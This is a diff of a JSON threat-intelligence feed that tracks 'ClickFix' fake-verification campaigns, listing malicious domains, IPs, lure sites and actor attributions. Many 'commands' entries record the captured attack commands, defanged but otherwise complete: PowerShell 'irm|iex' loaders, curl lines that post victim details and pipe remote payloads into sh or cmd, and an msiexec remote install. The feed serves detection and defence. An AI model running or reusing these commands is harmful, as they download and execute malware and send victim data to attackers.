@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5355,
+ "count": 5354,
  "indicators": [
   {
    "indicator": "1.15.58.123",
@@ -1963,7 +1963,8 @@
    ],
    "lure_from": [
     "codes.browse-cdn.beer",
-    "jjjducodes.beer"
+    "jjjducodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -4273,10 +4274,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "checkogosdfg33.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "checkogosdfg33.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -5513,11 +5514,11 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc",
     "fudcomcheck.art",
+    "verifyidentrob01.cc",
+    "fcdnbovres.cc",
     "checkogosdfg33.cc",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "govrobczxc.cc"
    ]
   },
   {
@@ -7649,7 +7650,9 @@
     "checkogosdfg33.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -8024,7 +8027,9 @@
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -8339,8 +8344,8 @@
    "lure_from": [
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -8929,7 +8934,9 @@
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -14844,10 +14851,10 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "verifyidentrob01.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -15362,9 +15369,9 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
+    "fcdnbovres.cc",
     "checkogosdfg33.cc",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "govrobczxc.cc"
    ]
   },
   {
@@ -16014,10 +16021,10 @@
     "checkogosdfg33.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "verifyidentrob01.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -16125,10 +16132,10 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
-    "checkogosdfg33.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "checkogosdfg33.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -35404,9 +35411,9 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
+    "fcdnbovres.cc",
     "checkogosdfg33.cc",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "govrobczxc.cc"
    ]
   },
   {
@@ -71573,17 +71580,17 @@
    "country": "FR",
    "ips": [
     {
-     "ip": "145.239.37.162",
-     "asn": "AS16276",
-     "org": "OVH OVH SAS, FR",
-     "first_seen": "2026-11-11",
-     "last_seen": "2026-11-13"
-    },
-    {
      "ip": "2001:41d0:301::30",
      "asn": "AS16276",
      "org": "OVH OVH SAS, FR",
      "first_seen": "2026-11-13",
+     "last_seen": "2026-11-13"
+    },
+    {
+     "ip": "145.239.37.162",
+     "asn": "AS16276",
+     "org": "OVH OVH SAS, FR",
+     "first_seen": "2026-11-11",
      "last_seen": "2026-11-13"
     }
    ],
@@ -73982,8 +73989,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=f309481f-6860-4c69-82ed-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fcslink.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-09T13%3A04%3A12.548Z&lastShellAt=2026-11-09T13%3A04%3A12.548Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=40f1df6c-e538-4b20-b97c-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcslink.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-09T12%3A58%3A32.373Z\"\" -d \"\"lastShellAt=2026-11-09T12%3A58%3A32.373Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=85eef1af-ff9d-4ff8-957c-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fcslink.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-13T12%3A54%3A20.058Z&lastShellAt=2026-11-13T12%3A54%3A20.058Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=734ffd61-2ba8-4b27-91bd-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcslink.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-13T12%3A52%3A29.135Z\"\" -d \"\"lastShellAt=2026-11-13T12%3A52%3A29.135Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -73993,7 +74000,8 @@
     "heartbeatyardpoint.com",
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer"
+    "jjjducodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -98150,64 +98158,6 @@
     "tf19h3b3.marya.store"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "eucking.eu",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-13",
-   "offline_since": null,
-   "url": "https://eucking.eu/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "92.113.16.55",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "DE",
-   "ips": [
-    {
-     "ip": "147.79.72.109",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    },
-    {
-     "ip": "92.113.16.55",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "eucking.eu",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": "dprk",
-   "actor_link": "linked",
-   "commands": [
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
-   ],
-   "connects_to": [
-    "fingerprint-veri.info"
-   ],
-   "lure_from": [
-    "ncheck-brows.beer",
-    "codes.browse-cdn.beer"
-   ]
   },
   {
    "indicator": "europackaging.it",
@@ -134273,9 +134223,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "curl -sL -d \"id=c88c8f19-320f-40d1-a7a7-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fihoturismo.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-09T13%3A03%3A47.008Z&lastShellAt=2026-11-09T13%3A03%3A47.008Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=df62b391-fe4d-4a4b-87cb-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fihoturismo.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-09T12%3A58%3A14.650Z\"\" -d \"\"lastShellAt=2026-11-09T12%3A58%3A14.650Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "curl -sL -d \"id=ee976d84-8f14-49e6-bcd2-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fihoturismo.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-06T13%3A26%3A17.592Z&lastShellAt=2026-11-06T13%3A26%3A17.592Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh"
+    "curl -sL -d \"id=2802862b-b990-4105-9fe4-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fihoturismo.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-13T12%3A54%3A14.445Z&lastShellAt=2026-11-13T12%3A54%3A14.445Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=f6d6ba4d-595f-49c9-80f8-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fihoturismo.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-13T12%3A52%3A11.448Z\"\" -d \"\"lastShellAt=2026-11-13T12%3A52%3A11.448Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\"",
+    "curl -sL -d \"id=c88c8f19-320f-40d1-a7a7-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fihoturismo.com.br%2F&os=Mac%2015&lastVisitAt=2026-11-09T13%3A03%3A47.008Z&lastShellAt=2026-11-09T13%3A03%3A47.008Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh"
    ],
    "connects_to": [],
    "lure_from": [
@@ -134283,7 +134233,8 @@
     "heartbeatyardpoint.com",
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer"
+    "jjjducodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -181738,8 +181689,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=6d68e333-d055-4f4b-b436-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fmryaseen.com%2F&os=Mac%2015&lastVisitAt=2026-11-09T13%3A03%3A31.227Z&lastShellAt=2026-11-09T13%3A03%3A31.227Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=4054d91c-515a-4631-abf3-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fmryaseen.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-09T12%3A57%3A49.093Z\"\" -d \"\"lastShellAt=2026-11-09T12%3A57%3A49.093Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=b14551d4-b526-4590-9098-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fmryaseen.com%2F&os=Mac%2015&lastVisitAt=2026-11-13T12%3A25%3A03.258Z&lastShellAt=2026-11-13T12%3A25%3A03.258Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=5dbbdc75-a93c-4a1c-bb56-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fmryaseen.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-13T12%3A21%3A41.321Z\"\" -d \"\"lastShellAt=2026-11-13T12%3A21%3A41.321Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -181747,7 +181698,8 @@
    "lure_from": [
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer"
+    "jjjducodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -195383,8 +195335,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=957e7fc8-e860-47c3-9b91-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fpapantonakis.gr%2F&os=Mac%2015&lastVisitAt=2026-11-09T13%3A03%3A40.056Z&lastShellAt=2026-11-09T13%3A03%3A40.056Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=b2f02819-a18a-4ff6-9293-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fpapantonakis.gr%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-09T12%3A58%3A06.448Z\"\" -d \"\"lastShellAt=2026-11-09T12%3A58%3A06.448Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=731861cb-b456-41bf-bd86-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fpapantonakis.gr%2F&os=Mac%2015&lastVisitAt=2026-11-13T12%3A25%3A15.992Z&lastShellAt=2026-11-13T12%3A25%3A15.992Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=d69f43c6-6e78-4258-98ff-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fpapantonakis.gr%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-13T12%3A21%3A53.473Z\"\" -d \"\"lastShellAt=2026-11-13T12%3A21%3A53.473Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -195392,7 +195344,8 @@
    "lure_from": [
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
-    "jjjducodes.beer"
+    "jjjducodes.beer",
+    "browse-cloud.codes"
    ]
   },
   {
@@ -211078,8 +211031,10 @@
    "lure_from": [
     "fudcomcheck.art",
     "checkogosdfg33.cc",
+    "fcdnbovres.cc",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -211573,11 +211528,11 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc",
-    "checkogosdfg33.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "verifyidentrob01.cc",
+    "fcdnbovres.cc",
+    "checkogosdfg33.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -216028,7 +215983,9 @@
     "checkogosdfg33.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -216682,8 +216639,10 @@
    "lure_from": [
     "verifyidentrob01.cc",
     "fudcomcheck.art",
+    "fcdnbovres.cc",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -217862,7 +217821,9 @@
     "checkogosdfg33.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -217916,9 +217877,9 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
+    "fcdnbovres.cc",
     "checkogosdfg33.cc",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "govrobczxc.cc"
    ]
   },
   {
@@ -229323,19 +229284,22 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "msIeXEC.exe /i http:\\/www.web-api-cf.sbs\\3c0uhiebujj08e /Q S1=\" \"",
     "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=88f4|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=88f4|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=9bf3|iex"
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=88f4|iex</span>"
    ],
    "connects_to": [
-    "ubbrobccheck20.cc"
+    "ubbrobccheck20.cc",
+    "www.web-api-cf.sbs"
    ],
    "lure_from": [
     "verifyidentrob01.cc",
     "fudcomcheck.art",
     "checkogosdfg33.cc",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -233917,7 +233881,9 @@
     "verifyidentrob01.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -239447,7 +239413,9 @@
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -241365,7 +241333,9 @@
     "checkogosdfg33.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -246869,7 +246839,9 @@
     "fudcomcheck.art",
     "checkogosdfg33.cc",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -257435,6 +257407,13 @@
    "country": "GB",
    "ips": [
     {
+     "ip": "185.151.30.171",
+     "asn": "AS48254",
+     "org": "TWENTYI 20i Limited, GB",
+     "first_seen": "2026-11-13",
+     "last_seen": "2026-11-13"
+    },
+    {
      "ip": "2a07:7800::171",
      "asn": "AS48254",
      "org": "TWENTYI 20i Limited, GB",
@@ -258076,7 +258055,9 @@
     "fudcomcheck.art",
     "checkogosdfg33.cc",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -260985,8 +260966,8 @@
    "lure_from": [
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -261880,10 +261861,10 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
-    "checkogosdfg33.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "checkogosdfg33.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -264021,10 +264002,10 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
-    "checkogosdfg33.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "checkogosdfg33.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -273535,7 +273516,9 @@
     "fudcomcheck.art",
     "checkogosdfg33.cc",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -275886,7 +275869,9 @@
     "verifyidentrob01.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -279684,8 +279669,8 @@
    "lure_from": [
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -285351,7 +285336,9 @@
     "checkogosdfg33.cc",
     "fudcomcheck.art",
     "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "webffoo001.cc",
+    "webffoo002.cc"
    ]
   },
   {
@@ -289833,8 +289820,8 @@
    "lure_from": [
     "ubbrobccheck20.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
